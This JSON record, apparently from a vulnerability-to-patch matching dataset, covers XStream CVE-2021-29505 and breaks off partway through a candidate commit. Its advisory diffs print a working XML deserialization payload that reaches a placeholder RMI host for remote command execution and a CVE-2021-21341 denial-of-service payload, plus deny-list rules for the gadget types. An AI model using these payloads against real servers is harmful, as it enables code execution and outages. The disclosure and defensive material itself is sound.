{
  "cve_id": "CVE-2021-29505",
  "cve_desc": "XStream is software for serializing Java objects to XML and back again. A vulnerability in XStream versions prior to 1.4.17 may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types is affected. The vulnerability is patched in version 1.4.17.",
  "repo": "x-stream/xstream",
  "patch_hash": "24fac82191292c6ae25f94508d28b9823f83624f",
  "patch_info": {
    "commit_hash": "24fac82191292c6ae25f94508d28b9823f83624f",
    "repo": "x-stream/xstream",
    "commit_url": "https://github.com/x-stream/xstream/commit/24fac82191292c6ae25f94508d28b9823f83624f",
    "files": [
      "xstream-distribution/src/content/CVE-2021-29505.html",
      "xstream-distribution/src/content/changes.html",
      "xstream-distribution/src/content/security.html",
      "xstream-distribution/src/content/website.xml"
    ],
    "message": "Add description of CVE-2021-29505 and bug fix.",
    "before_after_code_files": [
      "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html",
      "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
      "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
    ]
  },
  "patch_diff": {
    "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html": [
      "File: xstream-distribution/src/content/CVE-2021-29505.html -> xstream-distribution/src/content/CVE-2021-29505.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: <html>",
      "2: <!--",
      "3:  Copyright (C) 2021 XStream committers.",
      "4:  All rights reserved.",
      "6:  The software in this package is published under the terms of the BSD",
      "7:  style license a copy of which has been included with this distribution in",
      "8:  the LICENSE.txt file.",
      "10:  Created on 8. May 2021 by Joerg Schaible",
      "11:  -->",
      "12:   <head>",
      "13:     <title>CVE-2021-29505</title>",
      "14:   </head>",
      "15:   <body>",
      "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
      "19:     <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>",
      "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
      "23:  <p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is",
      "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
      "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
      "27:     <h2 id=\"description\">Description</h2>",
      "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
      "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
      "31:     input stream and replace or inject objects, that result in execution of a local command on the server.</p>",
      "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
      "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
      "36:  unmarshal it again with XStream:</p>",
      "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
      "38:   &lt;unserializable-parents/&gt;",
      "39:   &lt;java.util.PriorityQueue&gt;",
      "40:     &lt;default&gt;",
      "41:       &lt;size&gt;2&lt;/size&gt;",
      "42:     &lt;/default&gt;",
      "43:     &lt;int&gt;3&lt;/int&gt;",
      "44:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "45:       &lt;type&gt;12345&lt;/type&gt;",
      "46:       &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
      "47:         &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;",
      "48:       &lt;/value&gt;",
      "49:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "50:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "51:       &lt;type&gt;12345&lt;/type&gt;",
      "52:       &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
      "53:         &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
      "54:           &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
      "55:           &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
      "56:           &lt;bodyParts/&gt;",
      "57:           &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
      "58:             &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
      "59:             &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
      "60:               &lt;soapPart/&gt;",
      "61:               &lt;mm&gt;",
      "62:                 &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
      "63:                   &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;",
      "64:                     &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;",
      "65:                       &lt;names&gt;",
      "66:                         &lt;string&gt;aa&lt;/string&gt;",
      "67:                         &lt;string&gt;aa&lt;/string&gt;",
      "68:                       &lt;/names&gt;",
      "69:                       &lt;ctx&gt;",
      "70:                         &lt;environment/&gt;",
      "71:                         &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;",
      "72:                           &lt;java.rmi.server.RemoteObject&gt;",
      "73:                             &lt;string&gt;UnicastRef&lt;/string&gt;",
      "74:                             &lt;string&gt;ip2&lt;/string&gt;",
      "75:                             &lt;int&gt;1099&lt;/int&gt;",
      "76:                             &lt;long&gt;0&lt;/long&gt;",
      "77:                             &lt;int&gt;0&lt;/int&gt;",
      "78:                             &lt;short&gt;0&lt;/short&gt;",
      "79:                             &lt;boolean&gt;false&lt;/boolean&gt;",
      "80:                           &lt;/java.rmi.server.RemoteObject&gt;",
      "81:                         &lt;/registry&gt;",
      "82:                         &lt;host&gt;ip2&lt;/host&gt;",
      "83:                         &lt;port&gt;1099&lt;/port&gt;",
      "84:                       &lt;/ctx&gt;",
      "85:                     &lt;/candidates&gt;",
      "86:                   &lt;/aliases&gt;",
      "87:                 &lt;/it&gt;",
      "88:               &lt;/mm&gt;",
      "89:             &lt;/multiPart&gt;",
      "90:           &lt;/sm&gt;",
      "91:         &lt;/message&gt;",
      "92:       &lt;/value&gt;",
      "93:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "94:   &lt;/java.util.PriorityQueue&gt;",
      "95: &lt;/java.util.PriorityQueue&gt;",
      "96: </pre></div>",
      "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
      "98: xstream.fromXML(xml);",
      "99: </pre></div>",
      "101:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>",
      "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
      "105:     <h2 id=\"impact\">Impact</h2>",
      "107:  <p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by",
      "108:  manipulating the processed input stream.</p>",
      "110:     <h2 id=\"workarounds\">Workarounds</h2>",
      "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
      "114:     <h2 id=\"credits\">Credits</h2>",
      "116:     <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
      "118:    </body>",
      "119:  </html>",
      "",
      "---------------"
    ],
    "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
      "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "101:   <li>No support for Hibernate 3 collections.</li>",
      "102:  </ul>",
      "105:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
      "107:  <p>Not yet released.</p>",
      "110:  <h1 id=\"1.4.16\">1.4.16</h1>",
      "",
      "[Removed Lines]",
      "104: <!--",
      "108: -->",
      "",
      "[Added Lines]",
      "108:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
      "109:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
      "110:  security framework.</p>",
      "112:  <h2>Stream compatibility</h2>",
      "114:  <ul>",
      "115:   <li>The following types are now blacklisted by default and the deserialization",
      "116:   of XML containing one of the two types will fail.  You will have to enable these types by explicit",
      "117:   configuration, if you need them:<br>",
      "118:    <ul>",
      "119:     <li>any type in the java.rmi.* and sun.rmi.* package hierarchies</li>",
      "120:     <li>the individual type com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</li>",
      "121:    </ul>",
      "122:   </li>",
      "123:  </ul>",
      "",
      "---------------"
    ],
    "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
      "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "44:     Exposure (CVE) system managed by the <a href=\"http://www.mitre.org/\">Mitre Corporation</a>. Following a list of the",
      "45:     reported vulnerabilities for the different versions:</p>",
      "48:       <tr>",
      "49:         <th>CVE</th>",
      "50:         <th>Description</th>",
      "51:       </tr>",
      "52:       <tr>",
      "53:         <th>Version 1.4.15</th>",
      "54:         <td></td>",
      "",
      "[Removed Lines]",
      "47:     <table summary=\"Table of reported vulnerabilities daocumented as CVE\">",
      "",
      "[Added Lines]",
      "47:     <table summary=\"Table of reported vulnerabilities documented as CVE\">",
      "52:       <tr>",
      "53:         <th>Version 1.4.16</th>",
      "54:         <td></td>",
      "55:         <td></td>",
      "56:       </tr>",
      "57:       <tr>",
      "58:         <th><a href=\"CVE-2021-29505.html\">CVE-2021-29505</a></th>",
      "59:         <td>XStream is vulnerable to a Remote Command Execution attack.</td>",
      "60:       </tr>",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "393: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
      "395: </pre></div>",
      "397:     add these lines to XStream's setup code:</p>",
      "398: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
      "399: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
      "400: xstream.denyTypeHierarchy(java.io.InputStream.class );",
      "",
      "[Removed Lines]",
      "396:     <p>Users of XStream 1.4.14 who insist to use XStream default blacklist - despite that clear recommendation - can",
      "",
      "[Added Lines]",
      "405:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
      "407: <div class=\"Source Java\"><pre>xstream.denyTypesByRegExp(new String[]{ \".*\\\\.Lazy(?:Search)?Enumeration.*\", \"(?:java|sun)\\\\.rmi\\\\..*\" });",
      "408: </pre></div>",
      "409:     <p>Users of XStream 1.4.15 should <strong>additionally</strong> add these lines to the lines from above:</p>",
      "",
      "---------------",
      "--- Hunk 3 ---",
      "[Context before]",
      "402: xstream.denyTypeHierarchy(javax.activation.DataSource.class );",
      "403: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );",
      "404: </pre></div>",
      "406: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });",
      "407: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });",
      "408: </pre></div>",
      "",
      "[Removed Lines]",
      "405:     <p>Users of XStream 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
      "",
      "[Added Lines]",
      "417:     <p>Users of XStream 1.4.14 and 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "7e93c8c08d6896375161f9cdf3a89a31f5dd4edf",
      "candidate_info": {
        "commit_hash": "7e93c8c08d6896375161f9cdf3a89a31f5dd4edf",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/7e93c8c08d6896375161f9cdf3a89a31f5dd4edf",
        "files": [
          "xstream-distribution/src/content/security.html"
        ],
        "message": "Fix tabs.",
        "before_after_code_files": [
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
          "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "34:  <a href=\"CVE-2020-26217.html\">CVE-2020-26217</a>.</p>",
          "36:  <p>Note that the XML data can be manipulated on different levels.  For example, manipulating values on existing",
          "43:     <h2 id=\"external\">External Security</h2>",
          "",
          "[Removed Lines]",
          "37:   objects (such as a price value), or breaking the format and causing the XML parser to fail.  The latter case will",
          "38:   raise an\u00a0exception, but the former case must be handled by validity checks in any application which processes",
          "39:     user-supplied XML.  A worst case scenario is the injection of arbitrary code or shell commands, as noted above.",
          "40:     Even worse, <a href=\"CVE-2017-7957.html\">CVE-2017-7957</a> describes a case to crash the Java Virtual Machine",
          "41:     causing a Denial of Service.</p>",
          "",
          "[Added Lines]",
          "37:  objects (such as a price value), or breaking the format and causing the XML parser to fail.  The latter case will",
          "38:  raise an\u00a0exception, but the former case must be handled by validity checks in any application which processes",
          "39:  user-supplied XML.  A worst case scenario is the injection of arbitrary code or shell commands, as noted above.",
          "40:  Even worse, <a href=\"CVE-2017-7957.html\">CVE-2017-7957</a> describes a case to crash the Java Virtual Machine",
          "41:  causing a Denial of Service.</p>",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "f331c43ef3e270f3601981b8c426a97788292fb9",
      "candidate_info": {
        "commit_hash": "f331c43ef3e270f3601981b8c426a97788292fb9",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/f331c43ef3e270f3601981b8c426a97788292fb9",
        "files": [
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/download.html",
          "xstream-distribution/src/content/index.html",
          "xstream-distribution/src/content/news.html"
        ],
        "message": "Set release date and update news.",
        "before_after_code_files": [
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/download.html||xstream-distribution/src/content/download.html",
          "xstream-distribution/src/content/index.html||xstream-distribution/src/content/index.html",
          "xstream-distribution/src/content/news.html||xstream-distribution/src/content/news.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "98:   <li>No support for Hibernate 3 collections.</li>",
          "99:  </ul>",
          "101:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
          "103:  <p>Not yet released.</p>",
          "105:  <p class=\"highlight\">This maintenance release addresses the security vulnerabilities",
          "106:  <a href=\"CVE-2020-26258.html\">CVE-2020-26258</a> and <a href=\"CVE-2020-26259.html\">CVE-2020-26259</a>, when",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "101: <!--",
          "105: -->",
          "107:  <h1 id=\"1.4.15\">1.4.15</h1>",
          "109:  <p>Released December 13, 2020.</p>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/download.html||xstream-distribution/src/content/download.html": [
          "File: xstream-distribution/src/content/download.html -> xstream-distribution/src/content/download.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "19:     <p><a href=\"versioning.html\">About XStream version numbers...</a></p>",
          "23:     <ul>",
          "25:       Contains the XStream jar files, the Hibernate and Benchmark modules and all the dependencies.</li>",
          "27:       Contains the complete XStream project as if checked out from the Subversion version tag.</li>",
          "29:       The xstream.jar only as it is downloaded automatically when it is referenced as Maven dependency.</b></li>",
          "31:       The xstream-hibernate.jar as it is downloaded automatically when it is referenced as Maven dependency.</li>",
          "33:       The xstream-jmh-app.zip as standalone application with start scripts and all required libraries.</li>",
          "36:     </ul>",
          "38:     <h1 id=\"maven\">Maven Central Repository</h1>",
          "",
          "[Removed Lines]",
          "21:     <h1 id=\"stable\">Stable Version: <span class=\"version\">1.4.14</span></h1>",
          "24:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-distribution/1.4.14/xstream-distribution-1.4.14-bin.zip\">Binary distribution:</a></b>",
          "26:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-distribution/1.4.14/xstream-distribution-1.4.14-src.zip\">Source distribution:</a></b>",
          "28:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream/1.4.14/xstream-1.4.14.jar\">XStream Core only:</a>",
          "30:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-hibernate/1.4.14/xstream-hibernate-1.4.14.jar\">XStream Hibernate module:</a></b>",
          "32:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-jmh/1.4.14/xstream-jmh-1.4.14-app.zip\">XStream JMH module:</a></b>",
          "34:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream/1.4.14-java7/xstream-1.4.14-java7.jar\">XStream Core for Java 7 only:</a>",
          "35:       The xstream.jar only <a href=\"faq.html#Compatibility_Android\">without the Java 8 stuff</a> as it is downloaded automatically when it is referenced as Maven dependency.</b></li>",
          "",
          "[Added Lines]",
          "21:     <h1 id=\"stable\">Stable Version: <span class=\"version\">1.4.15</span></h1>",
          "24:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-distribution/1.4.15/xstream-distribution-1.4.15-bin.zip\">Binary distribution:</a></b>",
          "26:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-distribution/1.4.15/xstream-distribution-1.4.15-src.zip\">Source distribution:</a></b>",
          "28:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream/1.4.15/xstream-1.4.15.jar\">XStream Core only:</a>",
          "30:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-hibernate/1.4.15/xstream-hibernate-1.4.15.jar\">XStream Hibernate module:</a></b>",
          "32:       <li><b><a href=\"https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream-jmh/1.4.15/xstream-jmh-1.4.15-app.zip\">XStream JMH module:</a></b>",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "43:     <div class=\"Source XML\"><pre>&lt;dependency&gt;",
          "44:   &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;",
          "45:   &lt;artifactId&gt;xstream&lt;/artifactId&gt;",
          "47: &lt;/dependency&gt;</pre></div>",
          "49:     <h1 id=\"previous-releases\">Previous Releases</h1>",
          "",
          "[Removed Lines]",
          "46:   &lt;version&gt;1.4.14&lt;/version&gt;",
          "",
          "[Added Lines]",
          "44:   &lt;version&gt;1.4.15&lt;/version&gt;",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/index.html||xstream-distribution/src/content/index.html": [
          "File: xstream-distribution/src/content/index.html -> xstream-distribution/src/content/index.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "74:     <h1 id=\"news\">Latest News</h1>",
          "87:   </body>",
          "88: </html>",
          "",
          "[Removed Lines]",
          "76:     <h2 id=\"1.4.14\"><b>November 16, 2020</b> XStream 1.4.14 released</h2>",
          "78:       <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "79:       <a href=\"CVE-2020-26217.html\">CVE-2020-26217</a>, reported originally as CVE-2017-9805 for Struts' XStream",
          "80:       Plugin, an arbitrary execution of commands when unmarshalling for XStream instances with uninitialized security",
          "81:       framework.</p>",
          "83:       <p>View the complete <a href=\"changes.html\">change log</a> and <a href=\"download.html\">download</a>.</p>",
          "85:       <p>Note, the next major release 1.5 will require Java 8.</p>",
          "",
          "[Added Lines]",
          "76:     <h2 id=\"1.4.15\"><b>December 13, 2020</b> XStream 1.4.15 released</h2>",
          "78:  <p class=\"highlight\">This maintenance release addresses the security vulnerabilities",
          "79:  <a href=\"CVE-2020-26258.html\">CVE-2020-26258</a> and <a href=\"CVE-2020-26259.html\">CVE-2020-26259</a>, when",
          "80:  unmarshalling for XStream instances with uninitialized security framework.</p>",
          "82:  <p>View the complete <a href=\"changes.html\">change log</a> and <a href=\"download.html\">download</a>.</p>",
          "84:  <p>Note, the next major release 1.5 will require Java 8.</p>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/news.html||xstream-distribution/src/content/news.html": [
          "File: xstream-distribution/src/content/news.html -> xstream-distribution/src/content/news.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "17:   <body>",
          "19:     <h2 id=\"1.4.14\"><b>November 16, 2020</b> XStream 1.4.14 released</h2>",
          "21:       <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "19:     <h2 id=\"1.4.15\"><b>December 13, 2020</b> XStream 1.4.15 released</h2>",
          "21:  <p class=\"highlight\">This maintenance release addresses the security vulnerabilities",
          "22:  <a href=\"CVE-2020-26258.html\">CVE-2020-26258</a> and <a href=\"CVE-2020-26259.html\">CVE-2020-26259</a>, when",
          "23:  unmarshalling for XStream instances with uninitialized security framework.</p>",
          "25:  <p>View the complete <a href=\"changes.html\">change log</a> and <a href=\"download.html\">download</a>.</p>",
          "27:  <p>Note, the next major release 1.5 will require Java 8.</p>",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "f5dc978dd5cc483ed21896ee89227d4e1972d6f6",
      "candidate_info": {
        "commit_hash": "f5dc978dd5cc483ed21896ee89227d4e1972d6f6",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/f5dc978dd5cc483ed21896ee89227d4e1972d6f6",
        "files": [
          "xstream-distribution/src/content/CVE-2021-21341.html",
          "xstream-distribution/src/content/CVE-2021-21342.html",
          "xstream-distribution/src/content/CVE-2021-21343.html",
          "xstream-distribution/src/content/CVE-2021-21344.html",
          "xstream-distribution/src/content/CVE-2021-21345.html",
          "xstream-distribution/src/content/CVE-2021-21346.html",
          "xstream-distribution/src/content/CVE-2021-21347.html",
          "xstream-distribution/src/content/CVE-2021-21348.html",
          "xstream-distribution/src/content/CVE-2021-21349.html",
          "xstream-distribution/src/content/CVE-2021-21350.html",
          "xstream-distribution/src/content/CVE-2021-21351.html",
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html",
          "xstream-distribution/src/content/website.xml",
          "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java"
        ],
        "message": "Add CVEs, fixes and documentation.",
        "before_after_code_files": [
          "xstream-distribution/src/content/CVE-2021-21341.html||xstream-distribution/src/content/CVE-2021-21341.html",
          "xstream-distribution/src/content/CVE-2021-21342.html||xstream-distribution/src/content/CVE-2021-21342.html",
          "xstream-distribution/src/content/CVE-2021-21343.html||xstream-distribution/src/content/CVE-2021-21343.html",
          "xstream-distribution/src/content/CVE-2021-21344.html||xstream-distribution/src/content/CVE-2021-21344.html",
          "xstream-distribution/src/content/CVE-2021-21345.html||xstream-distribution/src/content/CVE-2021-21345.html",
          "xstream-distribution/src/content/CVE-2021-21346.html||xstream-distribution/src/content/CVE-2021-21346.html",
          "xstream-distribution/src/content/CVE-2021-21347.html||xstream-distribution/src/content/CVE-2021-21347.html",
          "xstream-distribution/src/content/CVE-2021-21348.html||xstream-distribution/src/content/CVE-2021-21348.html",
          "xstream-distribution/src/content/CVE-2021-21349.html||xstream-distribution/src/content/CVE-2021-21349.html",
          "xstream-distribution/src/content/CVE-2021-21350.html||xstream-distribution/src/content/CVE-2021-21350.html",
          "xstream-distribution/src/content/CVE-2021-21351.html||xstream-distribution/src/content/CVE-2021-21351.html",
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html",
          "xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java||xstream/src/test/com/thoughtworks/acceptance/SecurityVulnerabilityTest.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/CVE-2021-21341.html||xstream-distribution/src/content/CVE-2021-21341.html": [
          "File: xstream-distribution/src/content/CVE-2021-21341.html -> xstream-distribution/src/content/CVE-2021-21341.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 10. January 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21341</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21341: XStream can cause a Denial of Service.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject a manipulated ByteArrayInputStream (or derived class), that can cause an endless",
          "32:     loop resulting in a denial of service.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:  unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='javafx.collections.ObservableList$1'/&gt;",
          "44:     &lt;/default&gt;",
          "45:     &lt;int&gt;3&lt;/int&gt;",
          "46:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "47:       &lt;dataHandler&gt;",
          "48:         &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;",
          "49:           &lt;is class='java.io.ByteArrayInputStream'&gt;",
          "50:             &lt;buf&gt;&lt;/buf&gt;",
          "51:             &lt;pos&gt;-2147483648&lt;/pos&gt;",
          "52:             &lt;mark&gt;0&lt;/mark&gt;",
          "53:             &lt;count&gt;0&lt;/count&gt;",
          "54:           &lt;/is&gt;",
          "55:           &lt;consumed&gt;false&lt;/consumed&gt;",
          "56:         &lt;/dataSource&gt;",
          "57:         &lt;transferFlavors/&gt;",
          "58:       &lt;/dataHandler&gt;",
          "59:       &lt;dataLen&gt;0&lt;/dataLen&gt;",
          "60:     &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "61:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt;",
          "62:   &lt;/java.util.PriorityQueue&gt;",
          "63: &lt;/java.util.PriorityQueue&gt;",
          "64: </pre></div>",
          "65: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "66: xstream.fromXML(xml);",
          "67: </pre></div>",
          "69:     <p>As soon as the XML gets unmarshalled, the an endless loop is entered and the executing thread consumes maximum",
          "70:     CPU time and will never return.</p>",
          "72:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "74:     <h2 id=\"impact\">Impact</h2>",
          "76:  <p>The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU",
          "77:  type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed",
          "78:  input stream.</p>",
          "80:     <h2 id=\"workarounds\">Workarounds</h2>",
          "82:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "84:     <h2 id=\"credits\">Credits</h2>",
